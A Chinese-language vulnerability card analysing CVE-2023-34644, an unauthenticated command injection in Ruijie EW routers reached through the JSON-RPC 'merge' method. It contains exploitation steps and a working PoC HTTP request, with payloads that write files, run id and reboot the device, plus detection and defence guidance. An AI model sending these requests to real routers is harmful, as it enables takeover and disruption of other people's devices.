---
id: iot-ruijie-eweb-api-auth-merge-jsonrpc-ufm-popen-cmd-injection
title: 锐捷 EW 系列 /cgi-bin/luci/api/auth 未认证 merge 方法：lua 直接把 params 透传给 uf_client_call，最终在 unifyframe-sgi 的 ufm_popen 命令注入（CVE-2023-34644）
type: scenario
domain: iot
path: iot
technique: ruijie-eweb-jsonrpc-merge-ufm-popen-injection
aliases:
- CVE-2023-34644
- 锐捷 EW 路由器命令注入
- luci api/auth merge
- unifyframe-sgi ufm_popen
- uf_client_call 注入
tags:
- iot
- router
- ruijie
- command-injection
- lua
- json-rpc
- mips
- preauth
cve:
- CVE-2023-34644
severity: high
confidence: medium
affected_versions: 锐捷 EW 无线路由系列 EW_3.0 固件（原文取证环境；CVE-2023-34644 影响范围以厂商公告为准）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:56:48+08:00'
  notes: 已对照原文核对：eweb/api.lua 中 /api/auth 走 rpc_auth 且无需系统认证、rpc_auth 只判 HTTP_CONTENT_LENGTH 小于 1000、Jsonrpc.handle 按 method 在 _tbl 取函数并传 params、noauth 四个方法 login/singleLogin/checkNet/merge、login 的其余字段被赋固定值且 password 经 includeXxs 后又被 luci.json.encode 转义、checkNet 的 host 受 checkIp 限制（不长于 50 且只允许点冒号数字）、只有 merge 不过滤、dev_sta.fetch 到 client_call 到 uf_client_call 到 uf_socket_msg_read 到 parse_content 到 parse_obj2_cmd 到 pkg_add_cmd 到 add_pkg_cmd2_task 到 uf_task_remote_pop_queue 到 uf_cmd_call 到 ufm_handle 到 sub_40FD5C 与 sub_40CEAC 到 ufm_commit_add 到 async_cmd_push_queue 到 sub_41AFC8 与 sub_41ADF0 到 ufm_popen，以及正文 POST 报文与 hack.txt 落地，均与正文一致；受影响版本按原文 CVE-2023-34644 与 EW_3.0 固件保留作者标注，未新增未改（原文只给固件系列名与 CVE 编号，未给影响区间，卡内已注明以厂商公告为准）。本次核对未读取图片，IDA 与 lua 代码截图（img/06-44）与 hack.txt 回显（img/45）未核实；未对真实设备发请求。
---

## 一句话结论

锐捷 EW 系列路由器的前端路由是 lua（`/usr/lib/lua/luci/`），`eweb/api.lua` 把 `/api/auth` 交给 `rpc_auth` 且**不需要系统认证**；`rpc_auth` 用 `Jsonrpc.handle` 按 `method` 字段直接调用 `_tbl` 里的函数，其中 `merge` 既不校验参数也不转义，`params` 一路经 `cmd.devSta.set` → `dev_sta.fetch` → `libuflua!client_call` → `libunifyframe.so!uf_client_call` 送进 `unifyframe-sgi.elf`，最终被拼进 `ufm_popen` 的命令行，形成未认证命令注入（PoC 用 `` '`ls > /www/hack.txt`' `` 落地文件）。

## 原理

- **入口免认证**：`api.lua` 定义 `entry({"api","auth"}, call("rpc_auth"))`，即 `/cgi-bin/luci/api/auth`。`rpc_auth` 只判断 `HTTP_CONTENT_LENGTH < 1000`，然后 `ltn12.pump.all` 读 body 交给 `Jsonrpc.handle`，全程没有 session/口令校验。
- **jsonrpc 分发**：`Jsonrpc.handle` 取 body 的 `method` 字段在 `_tbl` 中查函数、把 `params` 作为参数传入。`noauth` 表里 `login`/`singleLogin`/`checkNet`/`merge` 四个方法可被未认证调用。
- **为什么只有 merge 可用**：`login` 里除 `password` 外其它字段都被赋固定值，`password` 过 `includeXxs` 虽未过滤 `\n`，但后续 `luci.json.encode` 会把换行转义掉；`checkNet` 的 `host` 要过 `checkIp`（长度 ≤50、只允许点/冒号/数字）。只有 `merge` 在调用 `cmd.devSta.set` 前**完全不过滤参数**。
- **跨进程链路**：`doParams` 解析出 `data`，`fetch` 把第四个之后的参数交给 `dev_sta.fetch`，后者调 `libuflua!client_call`；`client_call` 解析参数后调 `uf_client_call`（`libunifyframe.so`），把 `data/ip/password` 组成 json（`params`）并 `uf_socket_msg_write` 发给 `unifyframe-sgi.elf`。
- **sink**：接收端 `uf_socket_msg_read` → `parse_content`（固定 `devSat.set` 走 else 分支）→ `parse_obj2_cmd` → `pkg_add_cmd` → `add_pkg_cmd2_task` → 信号量唤醒 `uf_task_remote_pop_queue` → `deal_remote_config_handle` → `uf_cmd_call` → `ufm_handle` → `sub_40FD5C`/`sub_40CEAC` 里拼接命令字符串 → `ufm_commit_add` → `async_cmd_push_queue` → `sem_post` → `sub_41AFC8`/`sub_41ADF0`，最后 `ufm_popen` 执行。即 lua 层不转义 + 二进制层用 `popen`，两个条件叠加才成立。
- **为什么用反引号**：命令最终由 `/bin/sh -c` 解析，`data` 里的反引号会先被 shell 替换执行；用 `` `ls > /www/hack.txt` `` 可直接在 Web 根写文件验证。

## 触发条件

- 目标为受影响固件的锐捷 EW 系列路由器（原文环境 EW_3.0），`/cgi-bin/luci/api/auth` 可访问。
- 目标上 `unifyframe-sgi.elf` 与 `libuflua`/`libunifyframe.so` 正常运行（默认服务链路）。
- 请求体长度 < 1000 字节（`rpc_auth` 的硬限制）。
- 攻击者与设备网络可达（LAN 侧或已暴露到公网的 Web 管理界面）。

## 利用步骤

1. 确认 Web 服务指纹：访问 `/cgi-bin/luci/` 或抓包确认 luci/api 路径，判断为锐捷 EW 前端。
2. 直接 POST `/cgi-bin/luci/api/auth`，body 为 `{"method":"merge","params":{"attack":"'`cmd`'"}}`，无需任何 Cookie/认证头。
3. 用无副作用命令验证：`` `ls > /www/hack.txt` ``，随后 GET `/hack.txt` 读取输出。
4. 需要交互时把命令换成反弹 shell 或写 crontab 的 payload（注意长度 <1000，可分段）。
5. 若要深挖：按「lua → libuflua → libunifyframe → unifyframe-sgi」逐层在 qemu 仿真的 rootfs 里 gdb 跟进（挂 `gdbserver --attach` 到 `unifyframe-sgi.elf`），在 `ufm_popen` 下断确认命令拼接点。

## PoC

```http
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: 192.168.111.123
Content-Type: application/x-www-form-urlencoded
Connection: close

{"method": "merge", "params": {"attack": "'`ls > /www/hack.txt`'"}}
```

```text
验证：GET /hack.txt 返回目录列表，说明命令已执行。
其他 payload 形态：
  {"method":"merge","params":{"attack":"';id>/www/id.txt;'"}}
  {"method":"merge","params":{"attack":"'$(reboot)'"}}
前提：body 长度 < 1000 字节。
```

## 变体与关联

- **其它 method**：`merge` 之外，若固件版本把新方法加进 `noauth` 表且未过滤参数，同一链路可复用；反之 `login`/`checkNet` 因过滤而不可用。
- **过滤强度**：`includeXxs` 只挡常见 XSS 字符、不处理 `\n`，但 `luci.json.encode` 会转义换行——因此本链不能靠换行突破，只能靠 `data` 在二进制层被直接拼进 shell。
- **同族思路**：其它 luci 前端 + 后端 `popen/system` 的 IoT 设备，问题模式都是「lua 层只做 JSON 解析、不做 shell 转义，二进制层用 popen 拼串」。
- 关联：同路径下其它路由器 CGI 命令注入卡（boa/jhttpd/totolink 等）都是 Web 参数 → `system`/`popen` 的同类 sink，入口与中间层不同；固件侧的前置工作是「单字节异或解密 + QEMU mipsel 仿真 + gdbserver 附加」，见固件解密与 MIPS 仿真类卡片。

## 检测与防御

- 修复：`merge` 及所有 `noauth` 方法对进入 `cmd.*` 的参数做 shell 白名单/引号转义；`uf_client_call`/`ufm_popen` 侧禁止拼接未转义字符串（用 `execve` 数组或 `escapeshellarg` 等价实现）。
- 加固：`/api/auth` 增加认证或至少限制来源；不要将 Web 管理面暴露到公网；对外只开放必要端口。
- 检测：HTTP 日志中出现 `POST /cgi-bin/luci/api/auth` 且 body 含 `"method":"merge"` 与反引号/`$(`/`;`；`unifyframe-sgi` 进程派生 `sh -c` 且命令行含用户可控字符串；`/www/` 目录出现非固件自带文件（如 `hack.txt`）。
- 应急：按 IoC 检查 `/www`、`/tmp` 新增文件与 `unifyframe-sgi` 子进程，升级到厂商修复版本。
